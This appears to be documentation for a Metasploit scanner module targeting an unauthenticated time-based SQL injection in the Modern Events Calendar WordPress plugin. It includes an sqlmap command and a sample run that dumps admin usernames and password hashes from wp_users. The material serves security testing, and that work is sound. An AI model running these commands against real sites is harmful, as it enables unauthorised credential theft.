## Vulnerable Application

Modern Events Calendar plugin contains an unauthenticated timebased SQL injection in
versions before 6.1.5.  The `time` parameter is vulnerable to injection.

The plugin can be downloaded [here](https://downloads.wordpress.org/plugin/modern-events-calendar-lite.6.1.0.zip)

This module slightly replicates sqlmap running as:

```
sqlmap -u 'http://<IP>/wp-admin/admin-ajax.php?action=mec_load_single_page&time=2' -p "time" --technique T -T wp_users -C user_login,user_pass --dump --dbms mysql
```

## Verification Steps

1. Install the plugin, use defaults
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/wp_modern_events_calendar_sqli`
4. Do: `set rhosts [ip]`
5. Do: `run`
6. You should get the users and hashes returned.

## Options

### ACTION: List Users

This action lists `COUNT` users and password hashes.

## COUNT

If action `List Users` is selected (default), this is the number of users to enumerate.
The larger this list, the more time it will take.  Defaults to `1`.

## Scenarios

### Modern Events Calendar 6.1.0 on Wordpress 5.7.5 on Ubuntu 20.04

```
resource (calendar.rb)> use auxiliary/scanner/http/wp_modern_events_calendar_sqli
resource (calendar.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (calendar.rb)> set verbose true
verbose => true
resource (calendar.rb)> run
[*] Checking /wp-content/plugins/modern-events-calendar-lite/readme.txt
[*] Found version 6.1.0 in the plugin
[+] Vulnerable version of Modern Events Calendar detected
[*] {SQLi} Executing (select group_concat(FMuxps) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) FMuxps from wp_users limit 1) tXKksULcj)
[*] {SQLi} Encoded to (select group_concat(FMuxps) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0xde,0)),ifnull(user_pass,repeat(0x79,0))) as binary) FMuxps from wp_users limit 1) tXKksULcj)
[*] {SQLi} Time-based injection: expecting output of length 40
admin
$P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
